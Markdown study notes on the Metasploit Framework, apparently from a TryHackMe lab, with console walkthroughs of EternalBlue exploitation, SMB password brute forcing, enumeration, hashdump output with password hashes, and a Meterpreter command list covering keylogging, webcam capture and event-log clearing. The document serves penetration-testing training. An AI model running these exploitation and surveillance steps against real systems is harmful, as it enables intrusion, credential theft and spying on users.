# Metasploit

A practical, hands-on overview of the Metasploit Framework—its components,
common workflows, and real console examples.

> **Tip:** Use collapsible sections below to keep long outputs tidy on GitHub.

## Table of Contents

- [Metasploit](#metasploit)
  - [Table of Contents](#table-of-contents)
  - [Main Components of Metasploit](#main-components-of-metasploit)
    - [Key Terms](#key-terms)
    - [Module Types](#module-types)
  - [Initial Setup](#initial-setup)
  - [Using Metasploit](#using-metasploit)
    - [Common Options](#common-options)
    - [Unset \& Global Options (`setg`)](#unset--global-options-setg)
  - [Searching \& Info](#searching--info)
  - [Walkthroughs \& Examples](#walkthroughs--examples)
    - [EternalBlue (MS17-010)](#eternalblue-ms17-010)
    - [Port \& Service Discovery](#port--service-discovery)
    - [SMB Login Brute Force (Scanner)](#smb-login-brute-force-scanner)
    - [NetBIOS Enumeration](#netbios-enumeration)
    - [HTTP Version Detection](#http-version-detection)
    - [Finding Files with Meterpreter](#finding-files-with-meterpreter)
  - [Notes \& Good Practice](#notes--good-practice)
  - [Meterpreter](#meterpreter)

---

## Main Components of Metasploit

- **msfconsole**: The main command-line interface for interacting with
  Metasploit.
- **Modules** (building blocks):
  - **Exploits**: Code that leverages vulnerabilities on target systems.
  - **Auxiliary**: Scanners, crawlers, fuzzers, etc.
  - **Payloads**: Code executed on the target after exploitation (e.g., reverse
    shell).
  - **Encoders**: Obfuscate payloads to evade signature-based detection.
  - **Evasion**: Modules designed to bypass security mechanisms.
  - **NOPs**: “No Operation” instructions used as buffers in payloads.
  - **Post**: Post-exploitation modules for actions after gaining access.
- **Tools**: Stand-alone utilities for payload generation and exploit
  development.
  - Examples: `msfvenom` (payload generation), `pattern_create`,
    `pattern_offset` (exploit dev).

> _This module covers `msfvenom`; the pattern tools are helpful for exploit
> development._

### Key Terms

- **Exploit**: Code that takes advantage of a vulnerability on the target.
- **Vulnerability**: A flaw in design, code, or logic that can be exploited.
- **Payload**: The code delivered by an exploit to achieve a goal (shell,
  command exec, etc.).

### Module Types

Under **payloads** you’ll see four directories:

- **adapters**: Wrap single payloads into different formats (e.g., PowerShell
  one-liner).
- **singles**: Self-contained payloads that don’t fetch additional components.
- **stagers**: Set up a comms channel to deliver a larger **stage**.
- **stages**: The larger functionality downloaded by the stager.

---

## Initial Setup

```bash
msfupdate
msfconsole
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```bash
root@ip-10-10-63-107:~# msfupdate
# ... GPG key warning example ...
metasploit-framework is already the newest version (6.4.55~20250326102656~1rapid7-1)
```

```text
=[ metasploit v6.4.55-dev- ]
- -- --=[ 2502 exploits - 1287 auxiliary - 431 post ]
- -- --=[ 1616 payloads - 49 encoders - 13 nops ]
- -- --=[ 9 evasion ]
Metasploit Documentation: https://docs.metasploit.com/
```

```bash
msf6 > ls
msf6 > ping -c 1 8.8.8.8
msf6 > history
```

</details>

---

## Using Metasploit

### Common Options

- **RHOSTS**: Target host(s). Supports single IP, CIDR (`/24`), ranges (`x–y`),
  or file: `file:/path/to/targets.txt`.
- **RPORT**: Target service port.
- **PAYLOAD**: Payload to use with an exploit.
- **LHOST**: Your attacking host IP (listener).
- **LPORT**: Your listener port.
- **SESSION**: Session ID (for post-exploitation modules).

### Unset & Global Options (`setg`)

- Set a value: `set <NAME> <VALUE>`
- Clear one: `unset <NAME>`
- Clear all: `unset all`
- Global default: `setg <NAME> <VALUE>` (applies across modules)

---

## Searching & Info

```bash
msf6 > search type:auxiliary ssh_login
msf6 > info auxiliary/scanner/ssh/ssh_login
```

<details>
<summary><strong>Example: SSH Login Check Scanner (collapsed)</strong></summary>

```text
Name: SSH Login Check Scanner
Module: auxiliary/scanner/ssh/ssh_login
Rank: Normal
Options:
  RHOSTS (required), RPORT (22), USER_FILE, PASS_FILE, ...
Description:
  Tests SSH logins on a range of machines and reports successful logins.
References:
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
```

</details>

---

## Walkthroughs & Examples

### EternalBlue (MS17-010)

```bash
msf6 > setg RHOSTS 10.10.226.222
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > exploit -z
msf6 exploit(...) > sessions
msf6 exploit(...) > sessions -i 1
meterpreter >
```

<details>
<summary><strong>Full console output (collapsed)</strong></summary>

```text
[+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
[*] Meterpreter session 1 opened (10.10.63.107:4444 -> 10.10.226.222:49176)
...
```

</details>

---

### Port & Service Discovery

Search for scanners:

```bash
msf6 > search portscan
```

Use the TCP port scanner:

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > show options
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set PORTS 1-10000
msf6 auxiliary(...) > run
```

Run `nmap` from inside `msfconsole`:

```bash
msf6 > nmap -sS 10.10.108.124
```

<details>
<summary><strong>Sample Nmap output (collapsed)</strong></summary>

```text
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

</details>

---

### SMB Login Brute Force (Scanner)

```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set SMBUser penny
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(...) > run
```

<details>
<summary><strong>Result snippet (collapsed)</strong></summary>

```text
[+] 10.10.108.124:445 - Success: '.\penny:leo1234'
[_] ... Bruteforce completed, 1 credential was successful.
```

</details>

---

### NetBIOS Enumeration

```bash
msf6 > use auxiliary/scanner/netbios/nbname
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > run
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```text
[+] 10.10.108.124 [] OS:Unix Names:(**MSBROWSE**, , ACME IT SUPPORT) Mac:00:00:00:00:00:00
```

</details>

---

### HTTP Version Detection

```bash
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set RPORT 8000
msf6 auxiliary(...) > run
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```text
[+] 10.10.108.124:8000 webfs/1.21 (403-Forbidden)
```

</details>

---

### Finding Files with Meterpreter

```bash
meterpreter > pwd
meterpreter > search -f flag.txt
meterpreter > cd C:\Users\Jon\Documents
meterpreter > dir
meterpreter > cat flag.txt
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```text
Found 1 result
c:\Users\Jon\Documents\flag.txt  Size: 15
THM-5455554845
```

You can also dump hashes (requires appropriate privileges):

```bash
meterpreter > hashdump
```

```text
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:...:8ce9a3ebd1647fcc5e04025019f4b875:::
```

</details>

---

## Notes & Good Practice

- Most exploits have a default payload; list alternatives with `show payloads`.
- Use `info` (or `info -d`) to view full module details and references.
- Prefer **verification** modules (e.g., checks) before exploitation.
- Keep `setg` values tidy (`unsetg` by clearing with `unset` or new session) to
  avoid accidental reuse.
- Respect scopes, legal boundaries, and engagement rules at all times.

## Meterpreter

We have used the getpid command, which returns the process ID with which
Meterpreter is running. The process ID (or process identifier) is used by
operating systems to identify running processes. All processes running in Linux
or Windows will have a unique ID number; this number is used to interact with
the process when the need arises (e.g. if it needs to be stopped).

If we list processes running on the target system using the ps command, we see
PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.

Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries)
used by the Meterpreter process (PID 1304 in this case), we still would not find
anything jumping at us (e.g. no meterpreter.dll)

The easiest way to have an idea about available Meterpreter versions could be to
list them using msfvenom, as seen below.

We have used the msfvenom --list payloads command and grepped "meterpreter"
payloads (adding | grep meterpreter to the command line), so the output only
shows these.

Your decision on which version of Meterpreter to use will be mostly based on
three factors;

The target operating system (Is the target operating system Linux or Windows? Is
it a Mac device? Is it an Android phone? etc.) Components available on the
target system (Is Python installed? Is this a PHP website? etc.) Network
connection types you can have with the target system (Do they allow raw TCP
connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses
not as closely monitored as IPv4 addresses? etc.)

Meterpreter commands

Core commands will be helpful to navigate and interact with the target system.
Below are some of the most commonly used. Remember to check all available
commands running the help command once a Meterpreter session has started.

The getuid command will display the user with which Meterpreter is currently
running. This will give you an idea of your possible privilege level on the
target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a
regular user?)

The ps command will list running processes. The PID column will also give you
the PID information you will need to migrate Meterpreter to another process.

Core commands

background: Backgrounds the current session exit: Terminate the Meterpreter
session guid: Get the session GUID (Globally Unique Identifier) help: Displays
the help menu info: Displays information about a Post module irb: Opens an
interactive Ruby shell on the current session load: Loads one or more
Meterpreter extensions migrate: Allows you to migrate Meterpreter to another
process run: Executes a Meterpreter script or Post module sessions: Quickly
switch to another session File system commands

cd: Will change directory ls: Will list files in the current directory (dir will
also work) pwd: Prints the current working directory edit: will allow you to
edit a file cat: Will show the contents of a file to the screen rm: Will delete
the specified file search: Will search for files upload: Will upload a file or
directory download: Will download a file or directory Networking commands

arp: Displays the host ARP (Address Resolution Protocol) cache ifconfig:
Displays network interfaces available on the target system netstat: Displays the
network connections portfwd: Forwards a local port to a remote service route:
Allows you to view and modify the routing table System commands

clearev: Clears the event logs execute: Executes a command getpid: Shows the
current process identifier getuid: Shows the user that Meterpreter is running as
kill: Terminates a process pkill: Terminates processes by name ps: Lists running
processes reboot: Reboots the remote computer shell: Drops into a system command
shell shutdown: Shuts down the remote computer sysinfo: Gets information about
the remote system, such as OS Others Commands (these will be listed under
different menu categories in the help menu)

idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer keyscan_start: Starts capturing
keystrokes keyscan_stop: Stops capturing keystrokes screenshare: Allows you to
watch the remote user's desktop in real time screenshot: Grabs a screenshot of
the interactive desktop record_mic: Records audio from the default microphone
for X seconds webcam_chat: Starts a video chat webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam webcam_stream: Plays a
video stream from the specified webcam getsystem: Attempts to elevate your
privilege to that of local system hashdump: Dumps the contents of the SAM
database
